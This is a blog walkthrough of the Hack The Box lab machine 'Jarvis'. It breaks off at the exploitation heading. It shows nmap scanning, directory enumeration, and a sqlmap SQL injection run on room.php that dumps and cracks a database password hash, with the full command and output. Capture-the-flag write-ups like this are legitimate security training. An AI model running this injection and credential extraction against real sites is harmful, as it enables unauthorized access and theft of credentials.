---
layout: post
title: Jarvis - Hackthebox
date: 2019-11-10
Author: Dark0
tags: [sample, document]
toc: 
pinned: true
---

# Hackthebox - Jarvis | Walkthrough

#### Hello guys! Welcome to yet another from hackthebox walkthrough. The new box retired is Jarvis, so we'll solve it. Jarvis is a box classified at a medium level. With Jarvis we learn some skills related to the sqli and binary setuid exploit. Ok, let's go

## Penetration Methodologies

* **Scanning**

   + _nmap_
       
* **Enumeration**

   + _Browsing HTTP server_
   + _Directory Scanning using dirb_
   + _Getting creds with SQLi_

* **Exploitation**

  * **User**

   + _shell phpmyadmin_
   + _Command injection_

  * **Root**
   
   + _SETUID binarie_   
_____________________________________________________________________________________________________________________________

## Scanning

#### To start I just did it first scan with the nmap, we found two ports, 22 to ssh, and 80 to web service. Good, here we go

```
┌─[root@parrot]─[~]
└──╼ #nmap -T4 -A jarvis.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-10 02:19 -03
Nmap scan report for jarvis.htb (10.10.10.143)
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

```
______________________________________________________________________________________________________________________________

## Enumeration

#### Good, port 80 we get it web page, looks like a page of the hotel, maybe if we'll browse in the page we'll find something interesting

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2003-15-33.png)

#### with a little search in the page, I found a suspect link and decided to try to force SQL with a single quote and received a weird result...

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/quartos.png)


#### I've used the dirb to enumerate directories, but dirbuster and gobuster would work too. We see that the dirb found some pages, that's good. But the page what we interested to is `/phpmyadmin`

![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2002-19-10.png)

#### I used the sqlmap to dump the users and passwords hashes, the `--passwords` flag is for that

``sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" --passwords``

```
[04:27:04] [INFO] fetching database users password hashes
[04:27:04] [INFO] fetching database users
[04:27:04] [INFO] fetching number of database users
[04:27:04] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[04:27:04] [INFO] retrieved: 1
[04:27:05] [INFO] retrieved: 'DBadmin'@'localhost'
[04:27:26] [INFO] fetching number of password hashes for user 'DBadmin'
[04:27:26] [INFO] retrieved: 1
[04:27:27] [INFO] fetching password hashes for user 'DBadmin'
[04:27:27] [INFO] retrieved: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[04:33:12] [INFO] writing hashes to a temporary file '/tmp/sqlmapNCB3gB4320/sqlmaphashes-u13BSC.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
[04:33:16] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[04:33:19] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[04:33:22] [INFO] starting dictionary-based cracking (mysql_passwd)
[04:33:22] [INFO] starting 4 processes 
[04:33:25] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                                                                             
database management system users password hashes:                                                                                                                                            
[*] DBadmin [1]:
    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
    clear-text password: imissyou
```

#### User and password found: (DBadmin: imissyou), Let's try login in PHPMyAdmin

______________________________________________________________________________________________________________________________

## EXPLOITATION

   * **User**
   
   

